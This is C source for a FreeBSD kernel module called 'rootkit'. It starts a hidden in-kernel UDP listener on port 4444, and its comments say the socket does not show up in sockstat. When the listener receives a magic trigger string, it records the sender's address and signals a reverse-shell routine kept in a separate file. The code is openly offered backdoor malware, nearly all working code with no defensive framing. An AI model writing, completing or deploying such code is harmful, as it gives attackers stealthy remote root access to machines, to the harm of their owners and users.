#include <sys/param.h>
#include <sys/errno.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/kthread.h>
#include <sys/socket.h>
#include <sys/malloc.h>
#include <sys/socketvar.h>
#include <sys/uio.h>
#include <sys/ucred.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/condvar.h>
#include <netinet/in.h>

#include "interface.h"

#define TRIGGER_STRING "BSD_rootkit_REMOTE_MAGIC_TRIGGER_v1"
#define LISTEN_PORT    4444

/* Global synchronization primitives used by interface.c */
struct cv remote_cv;
struct mtx remote_mtx;
struct in_addr trigger_ip;
int trigger_flag = 0;

static struct socket *so_listen = NULL;
static volatile int remote_thread_running = 0;

/* --- Background In-Kernel UDP Listener Thread --- */
static void
remote_listener_thread(void *arg __unused)
{
    struct thread *td = curthread;
    struct sockaddr_in sin;
    int error;

    remote_thread_running = 1;

    /* Create kernel-space UDP socket (zero userland open ports in sockstat) */
    error = socreate(AF_INET, &so_listen, SOCK_DGRAM, IPPROTO_UDP, td->td_ucred, td);
    if (error != 0) {
        remote_thread_running = 0;
        kthread_exit();
        return;
    }

    bzero(&sin, sizeof(sin));
    sin.sin_len = sizeof(sin);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(LISTEN_PORT);
    sin.sin_addr.s_addr = INADDR_ANY;

    error = sobind(so_listen, (struct sockaddr *)&sin, td);
    if (error != 0) {
        soclose(so_listen);
        so_listen = NULL;
        remote_thread_running = 0;
        kthread_exit();
        return;
    }

    char buf[128];
    struct uio auio;
    struct iovec aiov;

    while (remote_thread_running) {
        bzero(&auio, sizeof(auio));
        bzero(&aiov, sizeof(aiov));

        aiov.iov_base = buf;
        aiov.iov_len = sizeof(buf) - 1;
        auio.uio_iov = &aiov;
        auio.uio_iovcnt = 1;
        auio.uio_offset = 0;
        auio.uio_resid = sizeof(buf) - 1;
        auio.uio_segflg = UIO_SYSSPACE;
        auio.uio_rw = UIO_READ;
        auio.uio_td = td;

        struct sockaddr *from = NULL;
        int flags = MSG_DONTWAIT;

        error = soreceive(so_listen, &from, &auio, NULL, NULL, &flags);
        if (error == 0 && auio.uio_resid < (ssize_t)(sizeof(buf) - 1)) {
            int recvd = (sizeof(buf) - 1) - auio.uio_resid;
            buf[recvd] = '\0';

            if (strstr(buf, TRIGGER_STRING) != NULL && from != NULL) {
                struct sockaddr_in *from_in = (struct sockaddr_in *)from;
                mtx_lock(&remote_mtx);
                trigger_ip = from_in->sin_addr;
                trigger_flag = 1;
                cv_signal(&remote_cv); /* Signal waiting revshell process in interface.c */
                mtx_unlock(&remote_mtx);
            }
        }

        if (from != NULL)
            free(from, M_SONAME);

        pause("rootkit_poll", hz / 10); /* Poll every 100ms */
    }

    if (so_listen != NULL) {
        soclose(so_listen);
        so_listen = NULL;
    }

    kthread_exit();
}

/* --- Module Event Handler --- */
static int load(module_t module, int cmd, void *arg) {
    (void)module;
    (void)arg;

    int error = 0;

    switch (cmd) {
    case MOD_LOAD:
        mtx_init(&remote_mtx, "rootkit_mtx", NULL, MTX_DEF);
        cv_init(&remote_cv, "rootkit_cv");

        /* Initialize character device interface via interface.c */
        error = make_rootkit_dev();

        if (error == 0) {
            struct proc *p = NULL;
            error = kproc_create(remote_listener_thread, NULL, &p, 0, 0, "kmod_remote_listen");
            if (error == 0) {
                // printf("rootkit: module loaded & remote listener active\n");
            } else {
                // printf("rootkit: device created, failed to start listener (%d)\n", error);
            }
        } else {
            // printf("rootkit: failed to create device (%d)\n", error);
        }

        break;

    case MOD_UNLOAD:
        remote_thread_running = 0;

        mtx_lock(&remote_mtx);
        cv_broadcast(&remote_cv);
        mtx_unlock(&remote_mtx);

        destroy_rootkit_dev();

        cv_destroy(&remote_cv);
        mtx_destroy(&remote_mtx);
        printf("rootkit: module unloaded\n");
        break;

    case MOD_SHUTDOWN:
        break;

    default:
        error = EOPNOTSUPP;
        break;
    }

    return error;
}

static moduledata_t rootkit_module = {
    "rootkit",
    load,
    NULL
};

DECLARE_MODULE(rootkit, rootkit_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
